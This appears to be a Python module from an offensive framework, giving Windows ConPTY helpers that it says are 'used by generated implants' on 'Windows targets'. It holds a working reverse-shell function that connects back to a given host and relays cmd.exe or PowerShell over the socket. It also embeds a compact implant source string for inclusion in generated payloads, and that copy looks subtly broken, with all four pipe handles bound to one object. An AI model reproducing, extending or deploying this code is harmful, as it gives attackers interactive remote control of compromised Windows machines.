#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Windows ConPTY helpers.

Used by generated implants and can be imported directly on Windows targets.
Requires Windows 10 1809+ (build 17763) or Windows Server 2019+.
"""

from __future__ import annotations

import ctypes
import os
import struct
import sys
from ctypes import wintypes


def conpty_available() -> bool:
    if os.name != "nt":
        return False
    try:
        return bool(ctypes.windll.kernel32.CreatePseudoConsole)
    except Exception:
        return False


def _check(result, func, args):
    if not result:
        raise ctypes.WinError(ctypes.get_last_error())
    return args


class _COORD(ctypes.Structure):
    _fields_ = [("X", wintypes.SHORT), ("Y", wintypes.SHORT)]


class _SIZE(ctypes.Structure):
    _fields_ = [("X", wintypes.SHORT), ("Y", wintypes.SHORT)]


class _STARTUPINFOEXW(ctypes.Structure):
    _fields_ = [
        ("StartupInfo", wintypes.STARTUPINFOW),
        ("lpAttributeList", ctypes.c_void_p),
    ]


PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
CREATE_UNICODE_ENVIRONMENT = 0x00000400


def spawn_conpty_process(
    command_line: str,
    *,
    columns: int = 120,
    rows: int = 40,
) -> tuple[int, int, int]:
    """
    Spawn *command_line* attached to a ConPTY pipe pair.

    Returns (process_handle, con_in_fd, con_out_fd) where fds are OS handles
    cast to int for use with os.read/os.write on Windows.
    """
    if not conpty_available():
        raise OSError("CreatePseudoConsole is not available on this Windows build")

    kernel32 = ctypes.windll.kernel32

    CreatePseudoConsole = kernel32.CreatePseudoConsole
    CreatePseudoConsole.argtypes = [_SIZE, wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(ctypes.c_void_p)]
    CreatePseudoConsole.restype = wintypes.HRESULT

    ClosePseudoConsole = kernel32.ClosePseudoConsole
    ClosePseudoConsole.argtypes = [ctypes.c_void_p]
    ClosePseudoConsole.restype = None

    InitializeProcThreadAttributeList = kernel32.InitializeProcThreadAttributeList
    UpdateProcThreadAttribute = kernel32.UpdateProcThreadAttribute
    DeleteProcThreadAttributeList = kernel32.DeleteProcThreadAttributeList
    CreateProcessW = kernel32.CreateProcessW

    pipe_in_read = wintypes.HANDLE()
    pipe_in_write = wintypes.HANDLE()
    pipe_out_read = wintypes.HANDLE()
    pipe_out_write = wintypes.HANDLE()

    sa = wintypes.SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(sa)
    sa.bInheritHandle = True

    if not kernel32.CreatePipe(ctypes.byref(pipe_in_read), ctypes.byref(pipe_in_write), ctypes.byref(sa), 0):
        raise ctypes.WinError()
    if not kernel32.CreatePipe(ctypes.byref(pipe_out_read), ctypes.byref(pipe_out_write), ctypes.byref(sa), 0):
        raise ctypes.WinError()

    # ConPTY input: we write to pipe_in_write, child reads pipe_in_read
    # ConPTY output: child writes pipe_out_write, we read pipe_out_read
    kernel32.SetHandleInformation(pipe_in_write, 1, 0)
    kernel32.SetHandleInformation(pipe_out_read, 1, 0)

    hpc = ctypes.c_void_p()
    size = _SIZE(_COORD(columns, rows))
    hr = CreatePseudoConsole(size, pipe_in_read, pipe_out_write, 0, ctypes.byref(hpc))
    if hr != 0:
        raise OSError(f"CreatePseudoConsole failed: 0x{hr & 0xFFFFFFFF:08x}")

    # Child-side ends are no longer needed in parent.
    kernel32.CloseHandle(pipe_in_read)
    kernel32.CloseHandle(pipe_out_write)

    attr_size = wintypes.SIZE_T(0)
    InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(attr_size))
    attr_list = ctypes.create_string_buffer(attr_size.value)
    if not InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(attr_size)):
        ClosePseudoConsole(hpc)
        raise ctypes.WinError()

    try:
        if not UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
            hpc,
            ctypes.sizeof(hpc),
            None,
            None,
        ):
            raise ctypes.WinError()

        si = _STARTUPINFOEXW()
        si.StartupInfo.cb = ctypes.sizeof(_STARTUPINFOEXW)
        si.lpAttributeList = ctypes.cast(attr_list, ctypes.c_void_p)

        pi = wintypes.PROCESS_INFORMATION()
        cmd = command_line if command_line.endswith("\0") else command_line + "\0"
        if not CreateProcessW(
            None,
            ctypes.create_unicode_buffer(cmd),
            None,
            None,
            False,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
            None,
            None,
            ctypes.byref(si.StartupInfo),
            ctypes.byref(pi),
        ):
            raise ctypes.WinError()
    finally:
        DeleteProcThreadAttributeList(attr_list)

    return int(pi.hProcess), int(pipe_in_write), int(pipe_out_read)


def relay_handles_to_socket(sock, con_in: int, con_out: int) -> None:
    """Bidirectionally relay ConPTY pipe handles and a connected socket."""
    import select
    import socket as pysocket

    con_in_handle = wintypes.HANDLE(con_in)
    con_out_handle = wintypes.HANDLE(con_out)

    def _read_handle(handle) -> bytes:
        buf = ctypes.create_string_buffer(4096)
        read = wintypes.DWORD(0)
        ok = ctypes.windll.kernel32.ReadFile(handle, buf, 4096, ctypes.byref(read), None)
        if not ok or read.value == 0:
            return b""
        return buf.raw[: read.value]

    def _write_handle(handle, data: bytes) -> None:
        if not data:
            return
        written = wintypes.DWORD(0)
        ok = ctypes.windll.kernel32.WriteFile(handle, data, len(data), ctypes.byref(written), None)
        if not ok:
            raise ctypes.WinError()

    sock.setblocking(False)
    while True:
        rlist = []
        try:
            if True:
                rlist.append(sock)
        except Exception:
            pass
        # Poll socket; always try reading ConPTY output
        try:
            chunk = _read_handle(con_out_handle)
            if chunk:
                sock.sendall(chunk)
            elif chunk == b"":
                break
        except Exception:
            break

        try:
            data = sock.recv(4096)
            if not data:
                break
            _write_handle(con_in_handle, data)
        except BlockingIOError:
            continue
        except pysocket.timeout:
            continue
        except Exception:
            break


def run_conpty_reverse_shell(host: str, port: int, shell: str = "cmd.exe") -> None:
    """Connect back and attach *shell* to the session via ConPTY."""
    import socket

    sock = socket.create_connection((host, int(port)))
    if shell.lower().endswith("powershell.exe"):
        cmdline = f"{shell} -NoLogo -NoProfile"
    else:
        cmdline = shell
    _proc, con_in, con_out = spawn_conpty_process(cmdline)
    relay_handles_to_socket(sock, con_in, con_out)


# Compact source embedded in generated Windows implants (no local imports).
CONPTY_IMPLANT_SOURCE = r'''
import ctypes,os,socket,struct,sys
from ctypes import wintypes
def _run(h,p,sh):
 k=ctypes.windll.kernel32
 class C(ctypes.Structure):
  _fields_=[("X",wintypes.SHORT),("Y",wintypes.SHORT)]
 class S(ctypes.Structure):
  _fields_=[("X",wintypes.SHORT),("Y",wintypes.SHORT)]
 class SI(ctypes.Structure):
  _fields_=[("StartupInfo",wintypes.STARTUPINFOW),("lpAttributeList",ctypes.c_void_p)]
 PTC=0x00020016;ESP=0x00080000;CUE=0x00000400
 ir=iw=or_=ow=wintypes.HANDLE()
 sa=wintypes.SECURITY_ATTRIBUTES();sa.nLength=ctypes.sizeof(sa);sa.bInheritHandle=True
 if not k.CreatePipe(ctypes.byref(ir),ctypes.byref(iw),ctypes.byref(sa),0):raise ctypes.WinError()
 if not k.CreatePipe(ctypes.byref(or_),ctypes.byref(ow),ctypes.byref(sa),0):raise ctypes.WinError()
 k.SetHandleInformation(iw,1,0);k.SetHandleInformation(or_,1,0)
 hpc=ctypes.c_void_p();sz=S(C(120,40))
 hr=k.CreatePseudoConsole(sz,ir,ow,0,ctypes.byref(hpc))
 if hr:raise OSError("CreatePseudoConsole failed")
 k.CloseHandle(ir);k.CloseHandle(ow)
 sz2=wintypes.SIZE_T(0);k.InitializeProcThreadAttributeList(None,1,0,ctypes.byref(sz2))
 al=ctypes.create_string_buffer(sz2.value)
 if not k.InitializeProcThreadAttributeList(al,1,0,ctypes.byref(sz2)):raise ctypes.WinError()
 if not k.UpdateProcThreadAttribute(al,0,PTC,hpc,ctypes.sizeof(hpc),None,None):raise ctypes.WinError()
 si=SI();si.StartupInfo.cb=ctypes.sizeof(SI);si.lpAttributeList=ctypes.cast(al,ctypes.c_void_p)
 pi=wintypes.PROCESS_INFORMATION()
 cmd=sh if sh.endswith("\0") else sh+"\0"
 if not k.CreateProcessW(None,ctypes.create_unicode_buffer(cmd),None,None,False,ESP|CUE,None,None,ctypes.byref(si.StartupInfo),ctypes.byref(pi)):raise ctypes.WinError()
 k.DeleteProcThreadAttributeList(al)
 s=socket.create_connection((h,int(p)))
 ci,co=int(iw),int(or_)
 def rh(h):
  b=ctypes.create_string_buffer(4096);n=wintypes.DWORD(0)
  ok=k.ReadFile(wintypes.HANDLE(h),b,4096,ctypes.byref(n),None)
  return b.raw[:n.value] if ok and n.value else b""
 def wh(h,d):
  if not d:return
  n=wintypes.DWORD(0)
  if not k.WriteFile(wintypes.HANDLE(h),d,len(d),ctypes.byref(n),None):raise ctypes.WinError()
 while True:
  try:
   o=rh(co)
   if o:s.sendall(o)
   elif o==b"":break
   d=s.recv(4096)
   if not d:break
   wh(ci,d)
  except: break
'''
